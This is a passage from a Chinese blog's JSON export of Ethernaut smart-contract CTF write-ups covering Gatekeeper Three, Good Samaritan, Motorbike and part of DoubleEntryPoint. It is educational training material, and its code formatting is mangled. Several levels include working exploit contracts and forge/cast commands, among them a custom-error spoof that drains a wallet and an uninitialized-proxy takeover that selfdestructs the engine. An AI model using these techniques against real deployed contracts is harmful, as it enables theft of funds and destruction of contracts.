false ) &#123; _; &#125; &#125; 这似乎是一个棘手的问题，因为我们必须满足两个条件： 当前合约的余额 ( address(this)) 必须大于 0.001 以太币。 向合约所有者（用 表示payable(owner)）发送 0.001 以太一定会失败（用 表示payable(owner).send(0.001 ether) == false）。 它证实了我的想法，即我们需要一个外部合约，因为我们可以某种方式revert()拒绝任何传入的 ETH。 高层行动计划如果您熟悉所有概念，这里是您可以遵循的行动计划。来吧，自己试试吧！ 用于createTrick()部署新的 SimpleTrick 合约 通过 web3js getStorageAt 函数取回密码 getAllowance(password)使用我们刚刚检索到的密码运行（gate 2 已解决） 发送 0.0011 以太币到实例合约地址（门 3 要求的一部分） 对于 gate1 和 gate3，我们需要创建一个合约来： 运行该construct0r()函数，使其成为所有者 创建一个函数，使其无法接收任何以太币 运行enter()函数 参赛者tx.origin现在应该是（我们的地址）。 一步一步的演练现在我们将逐步完成解决方案。首先，获取一个新实例。 获取新实例 您应该能够在控制台中看到一个实例地址。 获取您的实例地址 接下来，让我们去混音。在合同文件夹中创建一个文件，并将挑战中的所有代码粘贴到其中。你应该有这样的东西： 注意左边应该选择什么（先按左边的 ETH 标志）： 环境：我们需要使用 Injected Provider — MetaMask。 账户：选择加载了一些测试eth的账户（如果你评论你的地址，我会发给你一些）。 Contract : Gatekeeper Three 当然不是SimpleTrick。 这是诀窍： 如果您在蓝色按钮旁边输入合约地址At Address，您现在可以与已部署的合约进行交互。 （我以前觉得很神奇，但毕竟我们只需要3样东西就可以和EVM智能合约交互：ChainID，部署地址，合约&#x2F;ABI。） 这是按下At Address 按钮后您将看到的内容。接下来，我们可以使用createTrick 函数（橙色）来部署 SimpleTrick 合约的实例。 求解门 2由于trick（蓝色按钮）是一个公共变量，可以使用getter函数调用它。现在我们需要获取密码。如果您不知道 Solidity 中的存储是如何工作的，请谷歌。 在您的控制台中，运行以下行： 1await web3.eth.getStorageAt(“YOUR_SIMPLE_TRICK_ADDRESS”, 2, console.log) 您应该能够得到这样的十六进制数：0x00000000000000000000000000000000000000000000000000000000640bf3a8。 这将是密码。现在，回到 Remix，先打开 2 号门！ allow entry &#x3D; false 运行前getAllowance() getAllowance 使用我们从读取存储中获得的十六进制数运行该函数。请注意，allow_enterance在运行该函数之前，（错误的拼写）为假。运行“getAllowance”函数后，它将返回 true。 发送ETH解决50%门3对于 3 号门，我们必须向合约发送一小部分以太币，这样address(this).balance &gt; 0.001 ether才会成立。 在控制台中，我们可以使用这一行： 1234等待 web3.eth。sendTransaction ( &#123;from: player, to: “YOUR_INSTANCE_ADDRESS”, value: 10000000000000000 &#125; ) 对于“值”部分，虽然这不是最佳做法（因为输入那么多零通常会造成混淆），但我知道以太币是十进制的 18 位，因此加上 16 个零就是 0.01 以太币。 这不是你应该做的事情，但有时当你没有实用功能时（例如，与 Remix 或 Etherscan 上的合约交互），你只需要输入这些零。 当然，推荐的方式是这样的： 1await web3.eth.sendTransaction(&#123;from: player, to: “YOUR_INSTANCE_ADDRESS”, value: web3.utils.toWei(‘0.011’, ‘ether’)&#125;) 建筑解决方案合同我们还必须处理门 1 和门 3 的一部分。让我们总结需求并起草智能合约。它应该： 调用该construct0r()函数，使其成为 msg.sender。 有一个函数可以调用enter()函数，所以我们的地址可以变成tx.origin，msg.sender就是这个新合约。 该合约不应接收任何以太币。 这是我起草的一份小合同来处理所有这些问题。您不必按照我的方式进行（例如，尝试将函数放入solve()构造函数中，或将目标地址硬编码在其中）。 123456789101112131415161718合同解决方案&#123; GatekeeperThree公共目标； 地址公共所有者； 构造函数（地址_target）&#123; target = GatekeeperThree（payable（_target））; target.construct0r(); &#125; function solve () public returns ( bool entered ) &#123; entered = target.enter(); &#125; 接收 () 外部应付款 &#123; revert(); &#125; &#125; 您可以在混音的同一文件中将其作为合同键入。 在 Deploy 按钮顶部的合同框中，请记住选择合同解决方案。如果您按照我的指南操作，则还需要输入目标（GateKeeper 合约）地址。 最后，移动解决按钮并完成挑战！ 可以查看参赛者是否改成自己的地址： 返回 Ethernaut 并提交实例…… 做得好的消息总是令人满意。 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Good Samaritan","slug":"Smart contracts/ethernaut/Good Samaritan","date":"2023-03-13T05:29:10.000Z","updated":"2023-03-13T05:29:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Good Samaritan/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Good%20Samaritan/","excerpt":"","text":"Good Samaritan1. 题目要求 1.1 This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. Would you be able to drain all the balance from his Wallet? Things that might help: Solidity Custom Errors 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity &gt;=0.8.0 &lt;0.9.0; import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;; contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125; &#125; contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125; &#125; contract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125; &#125; interface INotifyable &#123; function notify(uint256 amount) external; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061- ## 2. 分析#### tips: 参考博客在这个级别，有 3 个合同。`GoodSamaritan`是我们将与之交互的那个。`contract.abi`我们可以通过在控制台中执行来验证这一点。![图片.png](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020024317.png)让我们看一下合同。### 钱包```soliditycontract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125;&#125; 钱包在顶部定义了两个自定义错误，它在 revert 语句中使用。 该函数donate10()被调用以向请求者捐赠 10 个硬币。它在转账前检查合约余额 ( )，如果小于 10，则GoodSamaritan返回自定义错误 ( )。否则，它只转账 10 个硬币。NotEnoughBalance() 函数transferRemainder()将存储在合约中的所有硬币转移给请求者。我们需要以某种方式触发此功能。 上面描述的两个函数onlyOwner都只允许所有者调用它们。GoodSamaritan在这种情况下，业主将签订合同。 硬币1234567891011121314151617181920212223242526272829contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125;&#125; Coin 合约将一百万个硬币添加到GoodSamaritan构造函数内部的合约余额中。 这里的功能transfer很重要。它正在进行定期验证，减少发件人的金额并增加目的地的金额。但是有一个特别的验证是突出的 - if(dest_.isContract())。这是检查请求捐赠的地址是否是合约，并调用notify()地址上的函数，即dest_合约。由于我们控制了请求者地址，我们可以在该地址上创建一个合约，并可能在调用之后控制执行流程INotifyable(dest_).notify(amount_)。 GoodSamaritan123456789101112131415161718192021222324contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125;&#125; 该合约正在部署Wallet和Coin合约的新实例。 这里的功能 1requestDonation() 很有趣。我们可以在外部调用这个函数。请注意，这整件事都在一个 1try and 1catch 块中。 该try块正在与调用该函数的任何人 wallet.donate10(msg.sender)一起执行调用。msg.sender 该catch块正在验证由于该块的错误而抛出的错误是否try与自定义错误消息的字符串相匹配NotEnoughBalance()。如果匹配，则钱包会将所有金额转移给我们。这就是我们需要实现的目标。 攻击流程让我们退后几步，跟踪调用该requestDonation()函数时发生了什么： 我们调用了requestDonation()，执行流程转到了wallet.donate10(msg.sender)。 coin.transfer()如果一切顺利，钱包合约就会调用。 该coin.transfer()函数进行必要的计算，检查我们的地址是否是一个合约，然后notify()在我们的地址上调用一个函数。 这是我们进攻的地方。我们notify()在我们的合约中创建一个函数，并让它恢复一个名为 的自定义错误NotEnoughBalance()。这将触发函数中的错误GoodSamaritan.requestDonation()，并且catch()将触发块向我们转移所有令牌。 但是等等，还有另一个问题。转移所有代币是行不通的，因为我们的合约只会恢复交易。为了解决这个问题，我们需要向我们的notify()函数添加另一个条件来检查是否amount &lt;= 10，然后只恢复。 利用下面是我们的漏洞利用代码的样子： 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../instances/Ilevel27.sol&quot;;contract BadSamaritan &#123; error NotEnoughBalance(); GoodSamaritan goodsamaritan = GoodSamaritan(0xcf2e93212faddDeB5ca99606104Be3Bae28e27A4); //ethernaut instance address function attax() external &#123; goodsamaritan.requestDonation(); &#125; function notify(uint256 amount) external pure &#123; if (amount &lt;= 10) &#123; revert NotEnoughBalance(); &#125; &#125;&#125; 该attax()函数仅用于调用requestDonation()以触发初始传输。 然后转账将调用我们的notify()函数，因为金额为 10，所以它会恢复。 然后，还原将触发区块catch并将requestDonation()所有代币转移给我们。 这次我们notify()不会因if条件而恢复。 让我们使用以下命令部署我们的合约： 1forge create BadSamaritan --private-key $PKEY --rpc-url $RPC_URL 现在调用attax()函数： 1cast send 0xb5daE871ADAFD33ee4B6Bf782a30b238902715F6 &quot;attax()&quot; --private-key $PKEY --rpc-url $RPC_URL --gas-limit 1000000 我指定了一个很大的 gas limit，因为交易一直失败。 现在可以提交实例以完成关卡。 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Motorbike","slug":"Smart contracts/ethernaut/Motorbike","date":"2023-03-13T04:23:10.000Z","updated":"2023-03-13T04:23:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Motorbike/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Motorbike/","excerpt":"","text":"Motorbike1. 题目要求 1.1 Ethernaut 的摩托车采用全新的可升级发动机设计。 你能启动selfdestruct它的引擎并使摩托车无法使用吗？ 可能有帮助的事情： EIP-1967 UUPS可升级模式 可初始化合约 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity &lt;0.7.0; import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;; import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;; contract Motorbike &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot &#123; address value; &#125; // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public &#123; require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(&quot;initialize()&quot;) ); require(success, &quot;Call failed&quot;); &#125; // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual &#123; _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); &#125; // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123; assembly &#123; r_slot := slot &#125; &#125; &#125; contract Engine is Initializable &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot &#123; address value; &#125; function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender; &#125; // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); &#125; // Restrict to upgrader role function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#39;t upgrade&quot;); &#125; // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal &#123; // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0) &#123; (bool success,) = newImplementation.delegatecall(data); require(success, &quot;Call failed&quot;); &#125; &#125; // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); AddressSlot storage r; assembly &#123; r_slot := _IMPLEMENTATION_SLOT &#125; r.value = newImplementation; &#125; &#125; 12345678910111213141516171819## 2. 分析此级别使用称为[UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)（通用可升级代理标准）的代理模式。[我们在第 24 层](https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet)看到的最后一个是透明代理模式。不同之处在于，在 UUPS 代理模式中，合约升级逻辑也将编码在执行合约中，而不是代理合约中。这允许用户节省一些气体。这是结构的样子：![图片.png](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020024455.png)另一个区别是代理合约中定义了一个存储槽，用于存储逻辑合约的地址。每次升级逻辑合约时都会更新。这是为了防止存储冲突。有关更多信息，请参阅[EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)。在我们的例子中，代理合约是摩托车，实现/逻辑合约是引擎。当我们查看代理合约时，我们可以看到存储槽定义为：复制```soliditybytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; 该插槽存储执行合约的地址。 selfdestruct()当我们查看 Engine 合约时，我们可以看到合约代码中没有定义。那么我们将如何调用它呢？我们将尝试升级实施合约以将其指向我们已部署的攻击者合约。 为了升级逻辑，引擎合约定义了一个名为的函数upgradeToAndCall()： 复制 1234567function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data);&#125;function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);&#125; 这是为了_authorizeUpgrade()检查是否msg.sender是upgrader. 因此，要升级合约，我们需要确保我们是upgrader. 那么我们如何成为升级者呢？我们来看一下函数initialize()： 复制 1234function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender;&#125; initialize()是基于 UUPS 的合约中使用的特殊函数。并且，与initializer修饰符一起，它充当只能调用一次的构造函数。（这在修改器中检查initializer）。 这里应该注意的是，在此实现中，该initialize()函数应该由它正在执行的代理合约调用。你可以在它的构造函数中看到。但请记住，它是使用delegatecall(). 当调用者合约对另一个合约进行委托调用时，调用者合约的存储槽将使用逻辑合约的代码进行更新。 这意味着这delegatecall()是在代理合约的上下文中进行的，而不是在实现中进行的。 所以代理合约只能调用initialize()一次并且它会更新它的存储值是绝对正确的，但是如果我们要找到实施合约的部署地址并initialize()手动调用呢？在执行合同的上下文中，这还没有被调用。因此，如果我们要调用该函数，我们的用户 ( msg.sender) 将成为升级者。 一旦我们成为了，upgrader我们就可以调用upgradeToAndCall()我们自己的合约地址，我们可以在其中创建一个selfdestruct()函数。这应该足以解决水平。 利用让我们首先创建我们的攻击者合约，它将包含selfdestruct()函数： 复制 12345678// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Destructive &#123; function killed() external &#123; selfdestruct(address(0)); &#125; &#125; selfdestruct()只是一个在外部函数中被调用的简单合同killed()。 这是我们的漏洞利用脚本的样子： 复制 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;forge-std/Script.sol&quot;;import &quot;../instances/Ilevel25.sol&quot;;contract POC is Script &#123; Motorbike level25 = Motorbike(0xE7BaFbC26565E1047d1755B820Fa99Fb463a5BF4); Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))))); function run() external&#123; vm.startBroadcast(); engineAddress.initialize(); console.log(&quot;Upgrader is :&quot;, engineAddress.upgrader()); bytes memory encodedData = abi.encodeWithSignature(&quot;killed()&quot;); engineAddress.upgradeToAndCall(0x04dE0eA8556C85b94E61bC83B43d4FFb6DdC30F1, encodedData); vm.stopBroadcast(); &#125;&#125; Motorbike level25- 这是代理合约 Motorbike 的地址。 Engine engineAddress 123\\- 这包含引擎的地址，使用 vm.load(contract_address, slot_no) 123. 由于这会返回一个 bytes32 123值，地址是20个字节，所以我们需要将它转换为一个地址类型的变量。 address(uint160(uint256())) 12345这就是为什么要使用额外的。这也可以从控制台使用复制 await web3.eth.getStorageAt(contract.address, &#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#39;) 123456789101112131415- `engineAddress.initialize()`- 我们正在调用该`initialize()`函数以成为升级程序。- `console.log`- 它只是用来通过将地址记录到控制台来确保我们成为升级者。- `bytes memory encodedData`- 这是将在方法内部发送的数据`upgradeToAndCall()`。- `engineAddress.upgradeToAndCall`- 最后，我们正在调用升级实施合同。该函数期望实现的地址作为第一个参数，包含函数签名的编码数据作为第二个参数在升级合约时调用。调用完成后，实施合约将更改为我们已部署的`Destructive`合约，当前实施将对`delegatecall()`我们的合约`killed()`功能产生影响，从而破坏合约。部署破坏性合约并使用以下命令执行脚本：复制 forge create Destructive --private-key $PKEY --rpc-url $RPC_URL forge script ./script/level25.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv &gt; 确保在漏洞利用脚本中更新破坏性合约的地址。 现在可以提交实例以完成关卡。 ## 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"DoubleEntryPoint","slug":"Smart contracts/ethernaut/DoubleEntryPoint","date":"2023-03-13T04:20:10.000Z","updated":"2023-03-13T04:20:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/DoubleEntryPoint/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/DoubleEntryPoint/","excerpt":"","text":"DoubleEntryPoint1. 题目要求 1.1 此级别具有CryptoVault特殊功能，sweepToken功能。这是用于检索卡在合约中的代币的常用函数。操作CryptoVault使用underlying无法清除的令牌，因为它是 . 的重要核心逻辑组件CryptoVault。可以清除任何其他令牌。 底层代币是合约定义中实施的 DET 代币的一个实例DoubleEntryPoint，并CryptoVault持有 100 个单位。此外，CryptoVault还拥有 100 个LegacyToken LGT。 在此级别中，您应该找出错误所在CryptoVault并防止它被耗尽令牌。 该合约具有Forta合约功能，任何用户都可以注册自己的detection bot合约。Forta 是一个去中心化的、基于社区的监控网络，用于尽快检测 DeFi、NFT、治理、桥梁和其他 Web3 系统上的威胁和异常。你的工作是实现一个detection bot并在合约中注册它Forta。机器人的实施将需要发出正确的警报，以防止潜在的攻击或漏洞利用。 可能有帮助的事情： 双入口点如何为代币合约工作？ 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; interface DelegateERC20 &#123; function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); &#125; interface IDetectionBot &#123; function handleTransaction(address user, bytes calldata msgData) external; &#125; interface IForta &#123; function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external; &#125; contract Forta is IForta &#123; mapping(address =&gt; IDetectionBot) public usersDetectionBots; mapping(address =&gt; uint256) public botRaisedAlerts; function setDetectionBot(address detectionBotAddress) external override &#123; usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); &#125; function notify(address user, bytes calldata msgData) external override &#123; if(address(usersDetectionBots[user]) == address(0)) return; try usersDetectionBots[user].handleTransaction(user, msgData) &#123; return; &#125; catch &#123;&#125; &#125; function raiseAlert(address user) external override &#123; if(address(usersDetectionBots[user]) != msg.sender) return; botRaisedAlerts[msg.sender] += 1; &#125; &#125; contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#39;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125; &#125; contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125; &#125; contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940## 2. 分析- 这个挑战似乎是 OpenZeppelin 和 Forta 之间的合资企业，一个实时安全和操作监控。据我所知，试图向您解释您应该如何集成 Forta 系统来监控您的合同是一个挑战。让我们看看进展如何。 从挑战的描述（说实话不清楚）我们有两个令牌：`LegacyToken`顾名思义是一个已“弃用”的令牌（这在现实生活中发生过吗？）支持一个名为`DoubleEntryPoint`. 我们还有一个称为 Vault 的库`CryptoVault`，它具有一些功能（与挑战范围无关），并提供一种称为实用程序的方法，允许`sweepToken(IERC20 token)`任何人“扫描”（转移）到`sweptTokensRecipient`（部署时定义的地址）已发送的令牌不小心去了金库。该函数中唯一的检查是您不能扫除`underlying`Vault 的令牌。 在部署时，我们从这个配置开始： - `CryptoVault`持有**100 个 DET** ( `DoubleEntryToken`) - `CryptoVault`持有**100 LGT** ( `LegacyToken`) 我们的目标是创建一个**Forta DetectionBot**来监控合约并防止外部攻击者耗尽本`CryptoVault`不应耗尽的代币。 让我们回顾一下每个合同，看看我们是否能找到一些攻击媒介。 ### `LegacyToken.sol` ```solidity contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125; &#125; 它是一个`ERC20`继承自的令牌`Ownable`。合约`owner`的 可以通过调用`mint`新代币和更新变量的值。`delegate``delegateToNewContract` 奇怪的部分是在`transfer`覆盖了标准提供的默认函数的函数中`ERC20`。 如果没有定义委托（`address(delegate) == address(0)`），则合约使用标准的默认逻辑`ERC20`；否则执行`return delegate.delegateTransfer(to, value, msg.sender)`。 在这种情况下，`delegate`是`DoubleEntryPoint`合同本身。这是什么意思？当您在现实中执行转移时，`LegacyToken`它正在转发要执行的操作`DoubleEntryPoint.delegateTransfer`。让我们切换到另一个令牌代码，看看发生了什么 ### `DoubleEntryPoint.sol` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor( address legacyToken, address vaultAddress, address fortaAddress, address playerAddress ) public &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; 合约是`ERC20`继承自 和 的`DelegateERC20`普通代币`Ownable`。`DelegateERC20`是强制合约实现token`function delegateTransfer(address to, uint256 value, address origSender)`需要的功能的接口`LegacyToken`。 有时`constructor`，设置一些状态变量并将`100`令牌铸造到`CryptoVault`. 在进入`delegateTransfer`函数之前，让我们回顾一下`fortaNotify`函数修饰符 123456789101112131415modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // 